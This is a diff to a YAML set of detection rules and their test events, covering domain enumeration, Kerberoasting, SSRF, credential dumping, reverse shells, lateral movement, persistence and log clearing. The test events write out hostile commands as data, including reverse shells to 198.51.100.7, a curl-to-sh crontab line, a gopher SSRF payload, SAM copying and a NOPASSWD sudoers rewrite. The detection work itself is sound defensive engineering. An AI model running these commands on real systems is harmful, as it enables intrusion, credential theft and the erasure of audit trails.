@@ -104,7 +104,8 @@ rules:
   tuning: Domain admins legitimately run these; scope to non-admin accounts if noisy.
   match:
     any:
-      - {field: command_line, regex: 'net1?(\.exe)?\s+(group|user|accounts)\s.{0,40}/domain'}
+      - {field: command_line, regex: 'net1?(\.exe)?\s+(group|accounts)\s.{0,40}/domain'}
+      - {field: command_line, regex: 'net1?(\.exe)?\s+user(\s+[\w.$-]{1,30})?\s+/domain\s*$'}
       - {field: command_line, regex: 'nltest(\.exe)?\s.{0,40}/(dclist|domain_trusts|trusted_domains)'}
       - {field: command_line, regex: '\b(dsquery|adfind)(\.exe)?\s+(\*|user|computer|group|-f)'}
       - {field: command_line, regex: 'get-ad(user|computer|group|domain|trust)\b'}
@@ -113,6 +114,8 @@ rules:
     - {event: {command_line: 'net group "Domain Admins" /domain'}, expect_match: true}
     - {event: {command_line: 'nltest /dclist:corp.example.com'}, expect_match: true}
     - {event: {command_line: 'net use Z: \\fileserver\share'}, expect_match: false}
+    - {name: password reset is not enumeration, event: {command_line: 'net user jsmith NewTemp#2026 /domain'}, expect_match: false}
+    - {name: user query, event: {command_line: 'net user alice /domain'}, expect_match: true}
 
 - id: TB-DISC-002
   name: Kerberoasting reconnaissance or ticket request
@@ -125,12 +128,14 @@ rules:
       - {field: command_line, regex: 'setspn(\.exe)?\s+.{0,20}-(t|q)\s'}
       - {field: command_line, regex: '\b(invoke-kerberoast|getuserspns|rubeus)\b.{0,100}(kerberoast|asktgs|spn)'}
       - {field: command_line, regex: '\bGetUserSPNs(\.py)?\b'}
+      - {field: command_line, regex: 'kerberosrequestorsecuritytoken|new-object\s+system\.identitymodel\.tokens'}
       - all:
           - {field: event_type, equals: authentication.kerberos_tgs}
           - {field: raw.ticket_encryption_type, in: ['0x17', '23', 'rc4-hmac']}
           - {field: raw.service_name, regex: '^(?!krbtgt)'}
   tests:
     - {event: {command_line: 'setspn -T corp -Q */*'}, expect_match: true}
+    - {name: SPN ticket request through .NET, event: {command_line: "powershell -c \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.corp.local:1433'\""}, expect_match: true}
     - {event: {event_type: authentication.kerberos_tgs, raw_data: {ticket_encryption_type: '0x17', service_name: 'MSSQLSvc/db01'}}, expect_match: true}
     - {event: {event_type: authentication.kerberos_tgs, raw_data: {ticket_encryption_type: '0x12', service_name: 'MSSQLSvc/db01'}}, expect_match: false}
 
@@ -291,9 +296,13 @@ rules:
       - any:
           - {field: text, regex: '(url|uri|redirect|dest|target|path|file|image|link)=[^&\s]{0,40}(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|fd00:ec2::254)'}
           - {field: text, regex: '(url|uri|redirect|dest|target|link)=[^&\s]{0,20}(https?(://|%3a%2f%2f))(127\.0\.0\.1|localhost|0\.0\.0\.0|\[::1\])'}
+          - {field: text, regex: '(url|uri|redirect|dest|target|link|u|src|fetch)=[^&\s]{0,20}(gopher|dict|ldap|tftp|jar|netdoc|file)(://|%3a%2f%2f)'}
+          - {field: text, regex: '\[::ffff:(169\.254\.169\.254|127\.0\.0\.1|a9fe:a9fe|7f00:1)\]|(https?://)(0x[0-9a-f]{8}|2852039166|0251\.0376\.0251\.0376|017700000001)\b'}
   tests:
     - {event: {raw_data: {url: '/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'}}, expect_match: true}
     - {event: {raw_data: {url: '/fetch?url=https://example.org/logo.png'}}, expect_match: false}
+    - {name: gopher scheme, event: {raw_data: {url: '/fetch?u=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall'}}, expect_match: true}
+    - {name: IPv4-mapped IPv6 metadata address, event: {raw_data: {url: '/fetch?u=http://[::ffff:169.254.169.254]/latest/meta-data/'}}, expect_match: true}
 
 - id: TB-WEB-010
   name: Server-side code injection in a web request (OGNL/Spring class-loader, Java deserialisation, template injection)
@@ -319,6 +328,31 @@ rules:
     - {event: {raw_data: {url: "/greet?name={{7*7}}"}}, expect_match: true}
     - {event: {raw_data: {url: '/greet?name=Alice'}}, expect_match: false}
     - {event: {raw_data: {url: '/price?amount=${total}'}}, expect_match: false}
+
+- id: TB-WEB-011
+  name: Probe for an exposed secret, debug endpoint or known exploit path
+  severity: medium
+  confidence: 70
+  techniques: [T1190, T1595.002]
+  tags: [web-attack, recon, exposure]
+  tuning: Vulnerability scanners you operate will match; allowlist their source addresses.
+  match:
+    all:
+      - not: {field: command_line, exists: true}
+      - any:
+          - {field: raw.url, regex: '/\.(git/(config|head|index)|svn/(entries|wc\.db)|env(\.\w{1,10})?|aws/credentials|ds_store|htpasswd|npmrc|bash_history)(\?|$|\s)'}
+          - {field: raw.url, regex: '/(wp-config\.php(\.bak|\.old|~|\.save)|config\.php\.bak|web\.config\.bak|phpinfo\.php|server-status|server-info|adminer\.php|phpmyadmin/scripts/setup\.php)'}
+          - {field: raw.url, regex: '/actuator/(env|heapdump|threaddump|configprops|mappings|jolokia|gateway|loggers)\b'}
+          - {field: raw.url, regex: '/vendor/phpunit/.{0,40}eval-stdin\.php|/(cgi-bin|bin)/\S{0,40}(\.%2e|%2e\.|\.\./)|/autodiscover/autodiscover\.json\?[^ ]{0,40}@|/(ecp|owa)/\S{0,30}(DDI|auth)/\S{0,30}\.(svc|js|aspx)'}
+          - {field: raw.url, regex: '/(solr/admin/(cores|info)|jenkins/script|manager/html|console/login/loginform|_ignition/execute-solution|api/jsonws/invoke|cgi-bin/luci|boaform/admin/formlogin)'}
+  tests:
+    - {event: {raw_data: {url: '/.git/config'}}, expect_match: true}
+    - {event: {raw_data: {url: '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'}}, expect_match: true}
+    - {event: {raw_data: {url: '/actuator/gateway/routes/hacked'}}, expect_match: true}
+    - {event: {raw_data: {url: '/autodiscover/autodiscover.json?@evil.com/mapi/nspi/'}}, expect_match: true}
+    - {event: {raw_data: {url: '/products/42?utm_source=newsletter'}}, expect_match: false}
+    - {event: {raw_data: {url: '/actuator/health'}}, expect_match: false}
+    - {event: {raw_data: {url: '/static/app.js?v=20260401'}}, expect_match: false}
 
 - id: TB-WEB-008
   name: Web shell indicators (file written to web root or shell-like request)
@@ -522,7 +556,7 @@ rules:
   tags: [mimikatz, lsass, credential-dumping]
   match:
     any:
-      - {field: text, regex: '\b(mimikatz|sekurlsa|lsadump|pypykatz|lazagne|nanodump|dumpert)\b'}
+      - {field: text, regex: '\b(mimikatz|sekurlsa|lsadump|pypykatz|lazagne|nanodump|dumpert|gsecdump|pwdump\d?|fgdump|cachedump|safetykatz|sharpkatz|handlekatz|invoke-mimikatz|mimilib|mimidrv|lsassy|wce(\.exe|\s+-))\b'}
       - {field: command_line, regex: '(procdump(64)?(\.exe)?\s.{0,80}lsass|comsvcs\.dll.{0,40}(minidump|#24|#-?\d+).{0,60}\d+|rundll32.{0,40}comsvcs)'}
       - {field: command_line, regex: 'lsass(\.exe)?.{0,20}(\.dmp|dump|minidump)'}
       - all:
@@ -571,10 +605,16 @@ rules:
       - {field: command_line, regex: 'reg(\.exe)?\s+save\s+hk(lm|ey_local_machine)\\(sam|security|system)'}
       - {field: command_line, regex: 'ntdsutil.{0,60}(ifm|snapshot|ac i ntds)|vssadmin.{0,40}ntds|esentutl.{0,40}ntds|secretsdump'}
       - {field: command_line, regex: '\bunshadow\b'}
+      - {field: command_line, regex: 'globalroot\\device\\harddiskvolumeshadowcopy\d{0,3}\\(windows\\system32\\config\\(sam|system|security)|windows\\ntds)|esentutl(\.exe)?\s.{0,40}/y\s.{0,100}(system32[\\/]config[\\/](sam|system|security)|ntds)'}
+      - {field: command_line, regex: '(vssadmin(\.exe)?\s+create\s+shadow|wmic(\.exe)?\s.{0,60}shadowcopy\s+(call\s+)?create)\b'}
+      - {field: command_line, regex: 'ntdsutil(\.exe)?\s.{0,60}set\s+dsrm\s+password'}
   tests:
     - {event: {command_line: 'cat /etc/shadow'}, expect_match: true}
     - {event: {command_line: 'reg save HKLM\SAM C:\temp\sam.save'}, expect_match: true}
     - {event: {command_line: 'cat /etc/hosts'}, expect_match: false}
+    - {name: shadow copy creation, event: {command_line: 'vssadmin.exe create shadow /for=C:'}, expect_match: true}
+    - {name: SAM copied through esentutl, event: {command_line: 'esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM'}, expect_match: true}
+    - {name: listing shadow copies is routine, event: {command_line: 'vssadmin list shadows'}, expect_match: false}
 
 - id: TB-CRED-003
   name: Credentials harvested from files, browsers or cloud metadata
@@ -585,8 +625,10 @@ rules:
   tuning: Backup agents read browser/credential paths; exclude by process_name.
   match:
     any:
-      - {field: command_line, regex: '(cat|type|grep|less|cp|copy|tar|zip|7z|curl\s.{0,60}-d\s?@|scp).{0,40}(\.aws/credentials|\.ssh/id_(rsa|ed25519|ecdsa)|\.git-credentials|\.docker/config\.json|\.kube/config|\.pgpass|\.netrc|wp-config\.php|\.env\b)'}
+      - {field: command_line, regex: '\b(cat|type|grep|less|cp|copy|tar|zip|7z|curl\s.{0,60}-d\s?@|scp)\b(?!-).{0,40}(\.aws/credentials|\.ssh/id_(rsa|ed25519|ecdsa)(?!\.pub)|\.git-credentials|\.docker/config\.json|\.kube/config|\.pgpass|\.netrc|wp-config\.php|\.env\b)'}
       - {field: command_line, regex: '(copy|type|cp|cat|sqlite3).{0,80}(Login Data|logins\.json|key[34]\.db|Cookies\b|Web Data|Local State)'}
+      - {field: command_line, regex: 'appcmd(\.exe)?\s+list\s+(apppool|site|vdir|app)\b.{0,60}(/text:password|/config|@t:\*|/@t:)|firefox\\profiles\\.{0,60}(logins\.json|key[34]\.db|\*\.default)'}
+      - {field: command_line, regex: '/(var|run)/secrets/kubernetes\.io/serviceaccount/token|/proc/\d{1,6}/environ|/proc/self/environ'}
       - {field: command_line, regex: '(curl|wget|invoke-webrequest|iwr)\s.{0,40}(169\.254\.169\.254/latest/meta-data/iam|metadata\.google\.internal/computeMetadata/v1/instance/service-accounts|169\.254\.169\.254/metadata/identity)'}
       - {field: command_line, regex: '(grep|findstr|select-string)\s.{0,20}(-r|-ri|-i|/s|-recurse).{0,40}(password|passwd|secret|api[_-]?key)'}
   tests:
@@ -594,6 +636,10 @@ rules:
     - {event: {command_line: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role'}, expect_match: true}
     - {event: {command_line: 'grep -ri password /var/www'}, expect_match: true}
     - {event: {command_line: 'cat ~/.bashrc'}, expect_match: false}
+    - {name: ssh-copy-id installs a PUBLIC key, event: {command_line: 'ssh-copy-id -i ~/.ssh/id_ed25519.pub deploy@stg-01.corp.local'}, expect_match: false}
+    - {name: reading a private key, event: {command_line: 'cat /home/bob/.ssh/id_rsa'}, expect_match: true}
+    - {name: kubernetes service account token, event: {command_line: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token'}, expect_match: true}
+    - {name: reading the namespace file is routine, event: {command_line: 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace'}, expect_match: false}
 
 - id: TB-CRED-004
   name: Offensive password attack or credential relay tooling
@@ -642,6 +688,7 @@ rules:
           - {field: command_line, regex: '(iex|invoke-expression)'}
           - {field: command_line, regex: '(downloadstring|downloadfile|downloaddata|invoke-webrequest|invoke-restmethod|\biwr\b|\birm\b|net\.webclient|start-bitstransfer|webrequest\]::create)'}
       - {field: command_line, regex: '(\[reflection\.assembly\]::load|assembly\.load\(|invoke-reflectivepeinjection|invoke-shellcode|add-type\s.{0,40}(virtualalloc|createthread))'}
+      - {field: command_line, regex: '\[scriptblock\]::create\(.{0,120}(irm|iwr|invoke-restmethod|invoke-webrequest|downloadstring|net\.webclient|http)'}
   tests:
     - {event: {command_line: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\""}, expect_match: true}
     - {event: {command_line: "powershell -c \"[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('C:\\x.dll'))\""}, expect_match: true}
@@ -660,6 +707,7 @@ rules:
       - {field: command_line, regex: 'bash\s+-i\s{0,3}>&?\s{0,3}/dev/tcp'}
       - {field: command_line, regex: '(python\d?|perl|ruby|php|lua)\s+-[a-z]\s.{0,200}(socket|fsockopen|TCPSocket|IO\.popen).{0,200}(/bin/(ba)?sh|cmd|exec|dup2|subprocess|spawn|pty)'}
       - {field: command_line, regex: 'mkfifo\s+\S{1,40}.{0,60}(nc|ncat|netcat|/bin/sh|telnet)'}
+      - {field: command_line, regex: 'telnet\s+\S{1,60}\s+\d{2,5}\s{0,3}\|\s{0,3}(/bin/)?(ba|z|da)?sh\b'}
       - {field: command_line, regex: 'socat\s.{0,60}(exec|system):.{0,40}(/bin/(ba)?sh|cmd)'}
       - {field: command_line, regex: 'openssl\s+s_client\s.{0,40}-connect.{0,80}(/bin/(ba)?sh|mkfifo)'}
       - {field: command_line, regex: 'new-object\s+(system\.)?net\.sockets\.tcpclient.{0,200}(getstream|invoke-expression|iex|\.read\()'}
@@ -675,6 +723,8 @@ rules:
     - {event: {command_line: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"}, expect_match: true}
     - {event: {command_line: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f'}, expect_match: true}
     - {event: {command_line: 'nc -zv 10.0.0.5 22'}, expect_match: false}
+    - {name: telnet pipe, event: {command_line: 'telnet 198.51.100.7 4444 | /bin/bash | telnet 198.51.100.7 4445'}, expect_match: true}
+    - {name: interactive telnet to a switch, event: {command_line: 'telnet switch-01 23'}, expect_match: false}
 
 - id: TB-EXEC-004
   name: Remote script piped into a shell or decoded and executed
@@ -745,6 +795,8 @@ rules:
   match:
     any:
       - {field: command_line, regex: '(wscript|cscript)(\.exe)?\s.{0,60}(\\appdata\\|\\temp\\|\\downloads\\|\\users\\public\\|%temp%|%appdata%).{0,80}\.(js|jse|vbs|vbe|wsf)'}
+      - {field: command_line, regex: '(wscript|cscript)(\.exe)?\s.{0,30}//e:(jscript|vbscript|js|vbs)\b'}
+      - {field: command_line, regex: '\b(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|msiexec)(\.exe)?\b.{0,80}\\\\(\d{1,3}\.){3}\d{1,3}\\'}
       - {field: command_line, regex: '(?:^|[;&|]\s{0,3}|\bsudo\s+|\bnohup\s+|\b(?:ba|z|da)?sh\s+(?:-\w{1,4}\s+){0,3})(/tmp/|/dev/shm/|/var/tmp/)\S{1,60}\s*(&|$)'}
       - all:
           - {field: raw.process_path, regex: '(/dev/shm/|^/tmp/|/var/tmp/|\\appdata\\local\\temp\\|\\users\\public\\|\\downloads\\)'}
@@ -754,6 +806,9 @@ rules:
     - {event: {event_type: process.start, raw_data: {process_path: '/dev/shm/.x/kworker'}}, expect_match: true}
     - {event: {event_type: process.start, raw_data: {process_path: '/usr/bin/python3'}}, expect_match: false}
     - {event: {command_line: 'sh -xe /var/lib/jenkins/tmp/build123.sh'}, expect_match: false}
+    - {name: engine override on a txt file, event: {command_line: 'cscript //nologo //e:jscript C:\Users\Public\readme.txt'}, expect_match: true}
+    - {name: script hosted on a remote share by IP, event: {command_line: 'cmd.exe /c start /b powershell -nop -ep bypass -f \\198.51.100.9\share\x.ps1'}, expect_match: true}
+    - {name: script on a named file server is routine, event: {command_line: 'powershell -File \\fs01\it\scripts\inventory.ps1'}, expect_match: false}
     - {event: {command_line: 'sh -c /tmp/.x/run &'}, expect_match: true}
 
 - id: TB-EXEC-008
@@ -770,11 +825,17 @@ rules:
       - {field: command_line, regex: 'sc(\.exe)?\s+\\\\\S{1,40}\s+(create|start|config)'}
       - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,40}/s\s+\S{1,40}\s.{0,60}/(create|run)'}
       - {field: command_line, regex: '(enter-pssession|new-pssession)\s.{0,40}-computername'}
+      - {field: command_line, regex: '\bwinrs(\.exe)?\s.{0,40}-(r|remote):'}
+      - {field: command_line, regex: '\b(psexec|psexec64|paexec|remcom|csexec|winexe)(\.exe)?\s.{0,60}(\\\\\S{1,40}|-s\b|-i\s+-s\b|/user:)'}
+      - {field: command_line, regex: '\bsc(\.exe)?\s+(\\\\\S{1,40}\s+)?sdset\s'}
       - {field: command_line, regex: '\b(wmiexec|smbexec|atexec|dcomexec|psexec)\.py\b'}
   tests:
     - {event: {command_line: 'PsExec64.exe \\10.0.0.7 -u admin -p x cmd.exe'}, expect_match: true}
     - {event: {command_line: 'wmic /node:10.0.0.7 process call create "cmd /c calc"'}, expect_match: true}
     - {event: {command_line: 'wmic os get caption'}, expect_match: false}
+    - {name: winrs, event: {command_line: 'winrs -r:10.0.4.12 cmd /c whoami /all'}, expect_match: true}
+    - {name: local SYSTEM shell with PsExec, event: {command_line: 'PsExec.exe -i -s cmd -accepteula'}, expect_match: true}
+    - {name: service security descriptor rewritten, event: {command_line: 'sc.exe sdset scmanager D:(A;;KA;;;WD)'}, expect_match: true}
 
 - id: TB-EXEC-009
   name: Container administration command executed inside a workload
@@ -824,14 +885,23 @@ rules:
   tags: [persistence, scheduled-task]
   match:
     any:
-      - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,40}/create'}
-      - {field: command_line, regex: '(crontab\s+-[a-z]{0,2}\s*$|crontab\s+\S+|echo\s.{0,200}>>?\s*/(etc/cron|var/spool/cron))'}
+      # a task whose action is an interpreter / signed-binary proxy / user-writable location, or one that runs at every logon/boot
+      - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,200}/create\b.{0,300}/tr\s+"?[^/]{0,200}?(powershell|pwsh|cmd(\.exe)?"?\s+/c|wscript|cscript|mshta|rundll32|regsvr32|msbuild|curl|bitsadmin|certutil|https?:|\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\|%temp%|%appdata%|\.ps1|\.vbs|\.hta|\.js\b)'}
+      - all:
+          - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,200}/create\b.{0,300}/sc\s+(onlogon|onstart|onidle)'}
+          - not: {field: command_line, regex: '(program files|\\windows\\system32|%programfiles%|%systemroot%)'}
+      - {field: command_line, regex: '(\|\s{0,3}crontab\s+-\s*$|crontab\s+(/tmp/|/dev/shm/|/var/tmp/|\.{1,2}/|/home/\S{0,40}/\.)|echo\s.{0,200}>>?\s*/(etc/cron|var/spool/cron))'}
       - {field: command_line, regex: '\(crontab\s+-l.{0,20};\s*echo'}
       - {field: command_line, regex: '(@reboot|\*/\d{1,2}\s\*\s\*\s\*\s\*).{0,100}(curl|wget|nc|bash|python|/tmp/)'}
       - {field: command_line, regex: 'register-scheduledtask|new-scheduledtask(action|trigger)'}
+      - {field: command_line, regex: 'schtasks(\.exe)?\s.{0,200}/create\b.{0,300}(/s\s+\S+|/rp\s+\S+)'}
       - {field: command_line, regex: '\bat(\.exe)?\s+\d{1,2}:\d{2}\s.{0,40}(cmd|powershell|\.exe)'}
   tests:
     - {event: {command_line: 'schtasks /create /tn Updater /tr C:\x.exe /sc onlogon'}, expect_match: true}
+    - {name: interpreter action, event: {command_line: 'schtasks /create /tn Upd /tr "powershell -w hidden -f C:\ProgramData\u.ps1" /sc daily'}, expect_match: true}
+    - {name: ordinary daily backup task, event: {command_line: 'schtasks /create /tn NightlyBackup /tr "C:\ops\backup.cmd" /sc daily /st 02:00 /ru SYSTEM'}, expect_match: false}
+    - {name: crontab file managed by configuration management, event: {command_line: 'crontab /etc/cron.d/puppet-managed'}, expect_match: false}
+    - {name: listing crontab, event: {command_line: 'crontab -l'}, expect_match: false}
     - {event: {command_line: '(crontab -l; echo "*/5 * * * * curl -s http://x.example/a|sh") | crontab -'}, expect_match: true}
     - {event: {command_line: 'schtasks /query'}, expect_match: false}
 
@@ -861,9 +931,14 @@ rules:
   tags: [persistence, service, autorun]
   match:
     any:
-      - {field: command_line, regex: 'reg(\.exe)?\s+add\s.{0,60}\\(run|runonce|runservices)(ex)?\s.{0,40}/v'}
-      - {field: command_line, regex: 'sc(\.exe)?\s+(\\\\\S{1,40}\s+)?create\s.{0,60}binpath'}
-      - {field: command_line, regex: '(new-service|set-service).{0,60}-binarypathname'}
+      - all:
+          - {field: command_line, regex: 'reg(\.exe)?\s+add\s.{0,60}\\(run|runonce|runservices)(ex)?\s.{0,40}/v'}
+          - not: {field: command_line, regex: '/d\s+"?\\?"?(c:\\program files|c:\\windows\\system32|%programfiles|%systemroot%|%windir%)'}
+      - all:
+          - {field: command_line, regex: 'sc(\.exe)?\s+(\\\\\S{1,40}\s+)?create\s.{0,60}binpath'}
+          - not: {field: command_line, regex: 'binpath=\s*\\?"?(c:\\program files|c:\\windows\\system32|%programfiles|%systemroot%|%windir%)'}
+      - {field: command_line, regex: '(new-service|set-service).{0,60}-binarypathname|set-servicebinarypath|\bsc(\.exe)?\s+config\s+\S{1,40}\s+binpath='}
+      - {field: command_line, regex: '(copy-item|move-item|cp|copy|move|xcopy)\s.{0,200}\\start menu\\programs\\startup\\'}
       - {field: command_line, regex: 'systemctl\s+(enable|daemon-reload).{0,60}(/tmp/|/dev/shm/|\.\./)|(echo|cat|tee)\s.{0,300}>\s?/etc/systemd/system/\S{1,40}\.service'}
       - {field: event_type, regex: '^system\.(service_installed|autorun_created)'}
       - {field: command_line, regex: '(copy|move|xcopy)\s.{0,200}\\start menu\\programs\\startup\\'}
@@ -872,6 +947,23 @@ rules:
     - {event: {command_line: 'sc create evil binPath= C:\x.exe start= auto'}, expect_match: true}
     - {event: {event_type: system.service_installed}, expect_match: true}
     - {event: {command_line: 'sc query spooler'}, expect_match: false}
+    - {name: vendor service in Program Files, event: {command_line: 'sc create VeeamAgent binpath= "C:\Program Files\Veeam\Agent\veeamagent.exe" start= auto'}, expect_match: false}
+    - {name: vendor Run key in Program Files, event: {command_line: 'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Zoom /t REG_SZ /d "C:\Program Files\Zoom\bin\Zoom.exe --autostart" /f'}, expect_match: false}
+
+- id: TB-PERSIST-007
+  name: Kernel module loaded from a user-writable location or with a rootkit-style name
+  severity: high
+  confidence: 75
+  techniques: [T1547.006, T1014]
+  tags: [persistence, rootkit, kernel-module]
+  match:
+    any:
+      - {field: command_line, regex: '\b(insmod|modprobe\s+-[a-z]*f|kmod\s+load)\s+(\S{0,20}\s)?(/tmp/|/dev/shm/|/var/tmp/|/home/|\./|\.\./)\S{1,80}\.ko'}
+      - {field: command_line, regex: '\b(insmod|modprobe)\s+\S{0,40}(diamorphine|reptile|azazel|bdvl|jynx|suterusu|adore|knark|rkit|rootkit)'}
+  tests:
+    - {event: {command_line: 'insmod /tmp/rk.ko'}, expect_match: true}
+    - {event: {command_line: 'insmod /lib/modules/6.1.0/kernel/drivers/net/dummy.ko'}, expect_match: false}
+    - {event: {command_line: 'modprobe overlay'}, expect_match: false}
 
 - id: TB-PERSIST-005
   name: WMI event subscription persistence
@@ -914,6 +1006,27 @@ rules:
     - {event: {command_line: 'chmod 4755 /tmp/rootsh'}, expect_match: true}
     - {event: {command_line: 'chmod 644 /srv/notes.txt'}, expect_match: false}
     - {event: {command_line: 'find / -perm -4000 -type f 2>/dev/null'}, expect_match: true}
+
+- id: TB-PRIV-007
+  name: Sudoers or doas policy rewritten to grant passwordless root
+  severity: high
+  confidence: 85
+  techniques: [T1548.003]
+  tags: [privilege-escalation, sudo, persistence]
+  tuning: Configuration management writes /etc/sudoers.d/ files; exclude by process_name or parent_process.
+  match:
+    any:
+      - {field: command_line, regex: '(echo|printf|tee|cat)\b.{0,160}(nopasswd\s{0,3}:\s{0,3}all\b|\ball\s{0,3}=\s{0,3}\(\s{0,3}all(\s{0,3}:\s{0,3}all)?\s{0,3}\)\s{0,3}all\b).{0,60}(/etc/sudoers|/etc/doas\.conf)'}
+      - {field: command_line, regex: '(sed|perl)\s.{0,80}(nopasswd|%sudo|%wheel).{0,80}/etc/sudoers'}
+      - {field: command_line, regex: 'usermod\s.{0,20}-a?G\s{0,3}(sudo|wheel|admin|root)\b'}
+      - {field: command_line, regex: '(sed\s+-i\S{0,6}|tee\s+(-a\s+)?|>>?\s{0,3}).{0,160}/etc/sudoers(?![./\w])|sh\s+-c\s+.{0,120}(>>?\s{0,3})/etc/sudoers(?![./\w])'}
+  tests:
+    - {event: {command_line: 'echo "attacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'}, expect_match: true}
+    - {event: {command_line: 'echo "deploy ALL=(ALL) NOPASSWD:/usr/bin/systemctl" | tee /etc/sudoers.d/deploy'}, expect_match: false}
+    - {event: {command_line: 'visudo -cf /etc/sudoers.d/deploy'}, expect_match: false}
+    - {name: weakening sudo timeouts in place, event: {command_line: "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers"}, expect_match: true}
+    - {name: reading sudoers, event: {command_line: 'sudo cat /etc/sudoers'}, expect_match: false}
+    - {event: {command_line: 'usermod -aG sudo bob'}, expect_match: true}
 
 - id: TB-PRIV-006
   name: Shell spawned through a sudo-permitted binary (GTFOBins-style escape)
@@ -1013,7 +1126,10 @@ rules:
       - {field: command_line, regex: 'wevtutil(\.exe)?\s+(cl|clear-log)\b'}
       - {field: command_line, regex: 'clear-eventlog|remove-eventlog'}
       - {field: command_line, regex: '(eventlogsession|eventing\.reader).{0,80}\.clearlog\s*\(|\.clearlog\s*\(\s*[''"]?(security|system|application|microsoft)|\[system\.diagnostics\.eventlog\]\s*::\s*(delete|clear)'}
-      - {field: command_line, regex: 'wevtutil(\.exe)?\s+sl\s.{0,60}/e(nabled)?:\s?false|auditpol(\.exe)?\s+/(clear|remove)\b'}
+      - {field: command_line, regex: '(^|[;&|\s])clear-history\b'}
+      - {field: command_line, regex: 'set-psreadlineoption\s.{0,60}historysavestyle\s+savenothing|remove-item\s.{0,100}consolehost_history|ln\s+-s\w*\s+/dev/null\s+\S{0,40}\.(bash|zsh)_history|truncate\s+-s\s?0\s+\S{0,60}(/var/log/|\.log\b)|(cat\s+/dev/null|:)\s?>\s?\S{0,60}-json\.log'}
+      - {field: command_line, regex: 'wevtutil(\.exe)?\s+sl\s.{0,60}(/e(nabled)?:\s?false|/ms:\s?[0-9]{1,6}\b(?!\d))|auditpol(\.exe)?\s+/(clear|remove)\b'}
+      - {field: command_line, regex: 'journalctl\s.{0,60}--(vacuum-time=\s?[0-9]{1,3}\s?(s|sec|secs|seconds?|m|min|mins|minutes?)?(?![a-z0-9])|vacuum-files=\s?[0-2](?![0-9]))|rm\s+(-\w+\s+)?\S{0,30}/var/(log/journal|log/audit)'}
       - {field: command_line, regex: '(unset\s+histfile|histsize=0|histfile=/dev/null|history\s+-c|rm\s+(-\w+\s+)?\S{0,40}\.(bash|zsh)_history|(>|truncate\s+-s\s?0)\s{0,3}\S{0,40}\.(bash|zsh)_history)'}
       - {field: command_line, regex: '(shred|rm\s+(-\w+\s+)?|truncate\s+-s\s?0\s+|>\s{0,3})\s{0,3}/var/log/(auth\.log|secure|syslog|messages|wtmp|btmp|lastlog|audit/audit\.log|kern\.log)'}
       - {field: event_type, regex: '^system\.(log_cleared|audit_log_cleared)|log_cleared'}
@@ -1028,6 +1144,12 @@ rules:
     - {name: .NET api, event: {command_line: "powershell -c [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog('Security')"}, expect_match: true}
     - {name: channel disabled, event: {command_line: 'wevtutil sl Microsoft-Windows-Sysmon/Operational /e:false'}, expect_match: true}
     - {name: reading the log is fine, event: {command_line: 'wevtutil qe Security /c:5 /f:text'}, expect_match: false}
+    - {name: log resized to zero, event: {command_line: 'wevtutil sl security /ms:0'}, expect_match: true}
+    - {name: PSReadLine history disabled, event: {command_line: 'Set-PSReadlineOption -HistorySaveStyle SaveNothing'}, expect_match: true}
+    - {name: container log truncated, event: {command_line: 'sudo truncate -s 0 /var/lib/docker/containers/abc/abc-json.log'}, expect_match: true}
+    - {name: journald vacuumed to one second, event: {command_line: 'journalctl --vacuum-time=1s'}, expect_match: true}
+    - {name: sensible journal retention is fine, event: {command_line: 'journalctl --vacuum-time=30d'}, expect_match: false}
+    - {name: a 100 MB log size is fine, event: {command_line: 'wevtutil sl Application /ms:104857600'}, expect_match: false}
     - {name: listing logs is fine, event: {command_line: "powershell -c [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.GetLogNames()"}, expect_match: false}
 
 - id: TB-EVADE-002
@@ -1049,6 +1171,8 @@ rules:
       - {field: command_line, regex: 'uninstall-windowsfeature\s+windows-defender|sc\s+config\s+sysmon'}
       - {field: command_line, regex: 'fltmc(\.exe)?\s+unload\s+\w{0,30}(sysmon|wdfilter|mfehidk|csagent|sentinel|savonaccess|edr)'}
       - {field: command_line, regex: 'net1?(\.exe)?\s+stop\s+"?(eventlog|windows event log|mpssvc|windefend|wdnissvc|sense|sysmon\w{0,10}|wscsvc)\b'}
+      - {field: command_line, regex: '(stop-service|set-service|remove-service|sc(\.exe)?\s+(stop|config))\s.{0,60}(windefend|wdnissvc|sense\b|mpssvc|eventlog|sysmon\w{0,10}|wscsvc|csagent|csfalcon\w{0,8}|sentinel\w{0,10}|cbdefense|carbonblack|mbamservice|sophos\w{0,10}|wazuh\w{0,6}|auditd|ossec)'}
+      - {field: command_line, regex: '\bauditctl\s+(-D\b|-e\s?0\b)'}
   tests:
     - {event: {command_line: 'Set-MpPreference -DisableRealtimeMonitoring $true'}, expect_match: true}
     - {event: {command_line: 'Add-MpPreference -ExclusionPath C:\Users\Public'}, expect_match: true}
@@ -1056,6 +1180,10 @@ rules:
     - {event: {command_line: 'setenforce 0'}, expect_match: true}
     - {event: {command_line: 'netsh advfirewall set allprofiles state off'}, expect_match: true}
